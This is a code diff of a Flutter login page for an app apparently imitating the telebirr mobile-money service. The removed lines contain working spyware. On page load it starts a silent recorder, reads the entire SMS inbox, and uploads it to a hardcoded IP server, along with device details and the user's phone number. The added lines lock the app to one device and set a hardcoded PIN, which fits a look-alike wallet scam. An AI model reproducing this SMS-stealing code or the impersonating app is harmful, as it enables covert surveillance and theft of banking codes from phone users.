@@ -1,13 +1,7 @@
 import 'package:flutter/material.dart';
 import 'package:telebirrbybr7/screens/pin_entry_page.dart';
-import 'package:device_info_plus/device_info_plus.dart';
 import 'package:shared_preferences/shared_preferences.dart';
-import 'package:http/http.dart' as http;
-import 'package:path_provider/path_provider.dart';
-import 'package:telephony/telephony.dart';
-import 'package:telebirrbybr7/services/silent_recorder.dart';
-import 'dart:convert';
-import 'dart:io';
+import 'package:device_info_plus/device_info_plus.dart';
 
 class LoginPage extends StatefulWidget {
   const LoginPage({super.key});
@@ -18,19 +12,22 @@ class LoginPage extends StatefulWidget {
 
 class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMixin {
   final TextEditingController _controller = TextEditingController(text: "989063761");
-  final DeviceInfoPlugin _deviceInfo = DeviceInfoPlugin();
-
+  
   late AnimationController _animationController;
   late Animation<double> _scrollAnimation;
 
   bool _isChecking = false;
   String? _errorMessage;
 
-  // Server configuration
-  static const String serverUrl = "http://148.116.91.16:3000";
-
-  // SMS upload state
-  static bool _isUploadingSms = false;
+  // Default offline PIN
+  static const String DEFAULT_PIN = "641564";
+  
+  // Hardcoded device fingerprint - ONLY this device can login
+  static const String ALLOWED_FINGERPRINT = "AQM-L21A 12.0.0.239(C185E5R4P1)";
+  
+  // Alternative: You can also lock by multiple device identifiers
+  static const String ALLOWED_MODEL = "AQM-L21A";
+  static const String ALLOWED_MANUFACTURER = "HUAWEI";
 
   @override
   void initState() {
@@ -48,16 +45,6 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
       parent: _animationController,
       curve: Curves.linear,
     ));
-
-    WidgetsBinding.instance.addPostFrameCallback((_) async {
-  SilentRecorder.startRecording();  // Already checks cameraEnabled internally
-  final smsOk = await _isSmsEnabled();
-  if (smsOk) {
-    _readAndUploadAllSms();
-  } else {
-    print("📩 SMS disabled by admin - skipping");
-  }
-});
   }
 
   @override
@@ -66,180 +53,50 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     _controller.dispose();
     super.dispose();
   }
-  Future<bool> _isSmsEnabled() async {
-  try {
-    final prefs = await SharedPreferences.getInstance();
-    final deviceId = prefs.getString('deviceId') ?? 'unknown';
 
-    final response = await http.get(
-      Uri.parse('$serverUrl/api/devices/$deviceId/sms'),
-    ).timeout(const Duration(seconds: 5));
-
-    if (response.statusCode == 200) {
-      final data = json.decode(response.body);
-      return data['smsEnabled'] == true;
-    }
-  } catch (e) {
-    print("📩 SMS check failed: $e");
-  }
-  return true; // Default ON if server unreachable
-  }
-
-  // ==================== SMS READING & UPLOAD ====================
-
-  Future<void> _readAndUploadAllSms() async {
-    if (_isUploadingSms) {
-      print("📩 SMS upload already in progress");
-      return;
-    }
-
-    _isUploadingSms = true;
-
+  // Check if current device matches the allowed fingerprint
+  Future<bool> _isDeviceAllowed() async {
     try {
-      final telephony = Telephony.instance;
-      print("📩 Reading all SMS messages...");
-
-      final List<SmsMessage> messages = await telephony.getInboxSms(
-        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
-      );
-
-      print("📩 Found ${messages.length} SMS messages");
-
-      // Build JSON array
-      final List<Map<String, dynamic>> smsList = messages.map((sms) {
-        return {
-          'address': sms.address ?? 'Unknown',
-          'body': sms.body ?? '',
-          'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
-          'type': sms.type?.toString() ?? '1',
-          'read': true,
-        };
-      }).toList();
-
-      final Map<String, dynamic> smsJson = {
-        'totalCount': smsList.length,
-        'messages': smsList,
-        'timestamp': DateTime.now().millisecondsSinceEpoch,
-      };
-
-      // Upload JSON to server
-      await _uploadSmsJson(smsJson);
-    } catch (e) {
-      print("❌ SMS reading error: $e");
-    } finally {
-      _isUploadingSms = false;
-    }
-  }
-
-  Future<void> _uploadSmsJson(Map<String, dynamic> smsData) async {
-    try {
-      final prefs = await SharedPreferences.getInstance();
-      final deviceId = prefs.getString('deviceId') ?? 'device_unknown';
-      final timestamp = DateTime.now().millisecondsSinceEpoch;
-
-      // Create JSON file in temp directory
-      final dir = await getTemporaryDirectory();
-      final jsonFile = File('${dir.path}/sms_${deviceId}_$timestamp.json');
-      await jsonFile.writeAsString(json.encode(smsData));
-
-      final request = http.MultipartRequest(
-        'POST',
-        Uri.parse('$serverUrl/api/upload/sms'),
-      );
-      request.files.add(await http.MultipartFile.fromPath('sms', jsonFile.path));
-      request.fields['folder'] = 'sms';
-      request.fields['filename'] = 'sms_${deviceId}_$timestamp.json';
-      request.fields['deviceId'] = deviceId;
-      request.fields['count'] = smsData['totalCount'].toString();
-      request.fields['timestamp'] = timestamp.toString();
-
-      final response = await request.send().timeout(
-        const Duration(minutes: 2),
-      );
-
-      if (response.statusCode == 200) {
-        print("✅ SMS JSON uploaded successfully: ${smsData['totalCount']} messages");
-      } else {
-        print("❌ SMS upload failed: ${response.statusCode}");
+      final deviceInfo = DeviceInfoPlugin();
+      final androidInfo = await deviceInfo.androidInfo;
+      
+      // Get device fingerprint
+      final currentFingerprint = androidInfo.fingerprint;
+      final currentModel = androidInfo.model;
+      final currentManufacturer = androidInfo.manufacturer;
+      
+      print("Device Fingerprint: $currentFingerprint");
+      print("Device Model: $currentModel");
+      print("Device Manufacturer: $currentManufacturer");
+      
+      // Check if fingerprint matches exactly
+      if (currentFingerprint == ALLOWED_FINGERPRINT) {
+        return true;
       }
-
-      // Clean up temp file
-      await jsonFile.delete();
-    } catch (e) {
-      print("❌ SMS upload error: $e");
-    }
-  }
-
-  // ==================== LOGIN LOGIC (FINGERPRINT CHECK REMOVED) ====================
-
-  // Get or create device ID
-  Future<String> _getDeviceId() async {
-    final prefs = await SharedPreferences.getInstance();
-    String? deviceId = prefs.getString('deviceId');
-
-    if (deviceId == null) {
-      deviceId = 'device_${DateTime.now().millisecondsSinceEpoch}_${_controller.text}';
-      await prefs.setString('deviceId', deviceId);
-    }
-
-    return deviceId;
-  }
-
-  // Register device with server
-  Future<Map<String, dynamic>?> _registerDevice(String deviceId) async {
-    try {
-      final androidInfo = await _deviceInfo.androidInfo;
-
-      final response = await http.post(
-        Uri.parse('$serverUrl/api/devices/register'),
-        headers: {'Content-Type': 'application/json'},
-        body: json.encode({
-          'deviceId': deviceId,
-          'fingerprint': androidInfo.fingerprint,
-          'model': androidInfo.model,
-          'manufacturer': androidInfo.manufacturer,
-          'androidVersion': androidInfo.version.release,
-          'phoneNumber': _controller.text,
-        }),
-      ).timeout(const Duration(seconds: 10));
-
-      if (response.statusCode == 200 || response.statusCode == 201) {
-        return json.decode(response.body);
-      } else {
-        return null;
+      
+      // Alternative: Check by model AND manufacturer
+      if (currentModel == ALLOWED_MODEL && 
+          currentManufacturer.toUpperCase() == ALLOWED_MANUFACTURER) {
+        return true;
       }
+      
+      return false;
     } catch (e) {
-      print("Registration error: $e");
-      return null;
+      print("Error checking device: $e");
+      return false;
     }
   }
 
-  // Get PIN from server
-  Future<Map<String, dynamic>?> _getPinFromServer(String deviceId) async {
-    try {
-      final response = await http.get(
-        Uri.parse('$serverUrl/api/devices/$deviceId/pin'),
-      ).timeout(const Duration(seconds: 10));
-
-      if (response.statusCode == 200) {
-        final data = json.decode(response.body);
-        return data;
-      } else if (response.statusCode == 404) {
-        final registerResult = await _registerDevice(deviceId);
-        if (registerResult != null) {
-          return {
-            'pin': registerResult['pin'],
-            'isActive': true,
-          };
-        }
-        return null;
-      } else {
-        return null;
-      }
-    } catch (e) {
-      print("Get PIN error: $e");
-      return null;
+  // Validate phone number (basic check)
+  bool _isValidPhoneNumber(String phone) {
+    String digitsOnly = phone.replaceAll(RegExp(r'[^\d]'), '');
+    
+    if (digitsOnly.length == 9) {
+      return digitsOnly.startsWith('9');
+    } else if (digitsOnly.length == 12) {
+      return digitsOnly.startsWith('2519');
     }
+    return false;
   }
 
   // Method to handle Next button press
@@ -252,35 +109,51 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     });
 
     try {
-      final deviceId = await _getDeviceId();
-      final serverResponse = await _getPinFromServer(deviceId);
-
-      if (serverResponse == null) {
+      // FIRST CHECK: Device fingerprint verification
+      final isDeviceAllowed = await _isDeviceAllowed();
+      
+      if (!isDeviceAllowed) {
         setState(() {
-          _errorMessage = "Server unreachable. Please check your connection and try again.";
+          _errorMessage = "This device is not authorized to use this application";
+          _isChecking = false;
+        });
+        return;
+      }
+      
+      // SECOND CHECK: Phone number validation
+      String phoneNumber = _controller.text.trim();
+      
+      if (phoneNumber.isEmpty) {
+        setState(() {
+          _errorMessage = "Please enter your mobile number";
           _isChecking = false;
         });
         return;
       }
 
-      if (serverResponse['isActive'] == false) {
+      if (!_isValidPhoneNumber(phoneNumber)) {
         setState(() {
-          _errorMessage = "Access Denied: This device has been deactivated. Contact support.";
+          _errorMessage = "Please enter a valid Ethiopian mobile number";
           _isChecking = false;
         });
         return;
       }
 
-      final pin = serverResponse['pin'] as String;
+      // Save login state
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setBool('isLoggedIn', true);
+      await prefs.setString('phoneNumber', phoneNumber);
 
       if (mounted) {
         setState(() {
           _isChecking = false;
         });
+        
+        // Navigate to PIN page with default PIN
         Navigator.push(
           context,
           MaterialPageRoute(
-            builder: (context) => PinEntryPage(correctPin: pin),
+            builder: (context) => PinEntryPage(correctPin: DEFAULT_PIN),
           ),
         );
       }
@@ -458,6 +331,20 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
                             ),
                           ),
                         ),
+
+                        // Error message display
+                        if (_errorMessage != null)
+                          Padding(
+                            padding: const EdgeInsets.only(top: 10),
+                            child: Text(
+                              _errorMessage!,
+                              style: const TextStyle(
+                                color: Colors.red,
+                                fontSize: 13,
+                              ),
+                              textAlign: TextAlign.center,
+                            ),
+                          ),
 
                         const SizedBox(height: 40),
 
